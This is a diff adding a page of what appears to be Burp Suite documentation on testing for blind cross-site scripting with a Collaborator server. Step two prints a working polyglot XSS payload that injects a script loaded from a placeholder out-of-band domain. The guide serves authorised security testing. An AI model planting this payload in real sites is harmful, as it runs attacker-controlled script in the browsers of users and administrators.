@@ -1,0 +1,79 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/assets/ps/styles/psselfservice.css">
+<cms page-layout="FREESTYLE" ignore-validation="OTHER_PAGE_KEYWORD_TOO_FREQUENT"></cms>
+</head>
+<body class="section theme-white wrapper-themed">
+<section class="container ps-breadcrumbs">
+    <ol class="breadcrumb-list">
+        <li>
+            <a href="https://portswigger.net/support">Support Center</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/index.html">Documentation</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/index.html">Desktop editions</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/testing-workflow/index.html">Testing workflow</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/testing-workflow/input-validation/index.html">Testing input validation</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/testing-workflow/input-validation/xss/index.html">Cross-site scripting</a>
+        </li>
+        <li>
+            <a href="/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-blind-xss.html">Testing for blind XSS</a>
+        </li>
+    </ol>
+</section>
+<section class="container labels-editions-wrapper">
+    <label class="label-edition is-professional">Professional</label>
+</section>
+<h1>Testing for blind XSS</h1>
+<p>
+    Blind cross-site scripting (XSS) is a type of stored XSS in which the data exit point is not accessible to the attacker, for example due to a lack of privileges.
+</p>
+<p>
+    To test for blind XSS vulnerabilities, you can use Burp Suite to inject an XSS payload that may trigger an out-of-band interaction with the Burp Collaborator server. Burp monitors the Collaborator server to identify whether an out-of-band interaction occurs. This indicates that the attack was successful.
+</p>
+<h2 cms-ignore-validation="DUPLICATE_HEADINGS" id="steps">Steps</h2>
+<p>
+    To test for blind XSS with Burp Suite:
+</p>
+<ol>
+    <li>
+        Right-click the request you want to investigate and select <strong>Send to Repeater</strong>.
+    </li>
+    <li>
+        In the <strong>Repeater</strong> tab, change a parameter's value to a proof-of-concept payload. As you don't know which characters may be filtered or encoded, use a payload that works in most contexts, such as: <code class="code-scrollable">&lt;/script&gt;&lt;svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'&gt;</code>
+    </li>
+    <li>
+        Right-click the appropriate place in the proof-of-concept payload to insert a Collaborator domain and select <strong>Insert Collaborator payload</strong>. For example, replace <code>yourcollaboratordomain</code> with the Collaborator domain.
+    </li>
+    <li>
+        Click <strong>Send</strong>.
+    </li>
+</ol>
+<p>
+    The command may be executed after a delay, for example when an administrator eventually views the page that contains the stored payload. The <strong>Collaborator</strong> tab flashes when an interaction occurs. You should return to the project file and check the <strong>Collaborator</strong> tab to identify any delayed interactions.
+</p>
+<div class="highlightedarea">
+    <h4 id="related-pages">Related pages</h4>
+    <ul>
+        <li>
+            <a href="/web-security/cross-site-scripting/index.html">Cross-site scripting</a>
+        </li>
+        <li>
+            <a href="https://portswigger.net/research/hunting-asynchronous-vulnerabilities">Blog post: Hunting asynchronous vulnerabilities</a>
+        </li>
+    </ul>
+</div>
+</body>
+</html>
